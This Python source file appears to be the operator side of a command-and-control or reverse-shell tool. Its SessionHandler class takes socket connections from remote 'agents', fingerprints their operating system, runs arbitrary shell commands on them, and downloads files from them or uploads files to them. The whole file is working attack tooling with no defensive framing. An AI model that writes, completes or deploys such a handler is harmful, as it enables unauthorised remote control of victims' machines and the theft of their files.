#!/usr/bin/env python3
import socket
import os
import base64

BUFFER    = 4096
DELIMITER = b"<<END>>"

class SessionHandler:
    def __init__(self, conn, addr, sid):
        self.conn    = conn
        self.addr    = addr
        self.sid     = sid
        self.os_info = "unknown"
        self.alive   = True
        self._get_os()

    def _get_os(self):
        try:
            self.send_cmd("uname -s 2>/dev/null || ver")
            self.os_info = self.recv_output().strip().splitlines()[0][:12]
        except Exception:
            self.os_info = "unknown"

    def send_cmd(self, cmd):
        self.conn.sendall((cmd + "\n").encode())

    def recv_output(self):
        data = b""
        while not data.endswith(DELIMITER):
            chunk = self.conn.recv(BUFFER)
            if not chunk:
                raise ConnectionResetError
            data += chunk
        return data[:-len(DELIMITER)].decode(errors="replace")

    def interact(self):
        print(f"\n[*] Interacting with session [{self.sid}] — {self.addr[0]}")
        print("[*] Commands: upload <src> <dst> | download <src> | exit\n")
        while self.alive:
            try:
                cmd = input(f"agent[{self.sid}]> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Returning to main menu.")
                break

            if not cmd:
                continue
            if cmd == "exit":
                print("[*] Returning to main menu.")
                break

            # File download: pull file from agent
            elif cmd.startswith("download "):
                remote = cmd.split(" ", 1)[1]
                self._download(remote)

            # File upload: push file to agent
            elif cmd.startswith("upload "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    print("[-] Usage: upload <local_src> <remote_dst>")
                    continue
                self._upload(parts[1], parts[2])

            else:
                try:
                    self.send_cmd(cmd)
                    print(self.recv_output(), end="")
                except ConnectionResetError:
                    print("[-] Agent disconnected.")
                    self.alive = False
                    break

    def _download(self, remote_path):
        try:
            self.send_cmd(f"__download__ {remote_path}")
            raw = self.recv_output().strip()
            if raw.startswith("ERROR:"):
                print(f"[-] {raw}")
                return
            data = base64.b64decode(raw)
            local = os.path.basename(remote_path)
            with open(local, "wb") as f:
                f.write(data)
            print(f"[+] Downloaded {remote_path} → {local} ({len(data)} bytes)")
        except Exception as e:
            print(f"[-] Download failed: {e}")

    def _upload(self, local_path, remote_path):
        try:
            if not os.path.isfile(local_path):
                print(f"[-] Local file not found: {local_path}")
                return
            with open(local_path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send_cmd(f"__upload__ {remote_path} {data}")
            result = self.recv_output().strip()
            print(f"[+] {result}")
        except Exception as e:
            print(f"[-] Upload failed: {e}")

    def run(self):
        # Keep session alive in background — agent output is consumed on demand
        pass

    def close(self):
        self.alive = False
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
            self.conn.close()
        except Exception:
            pass
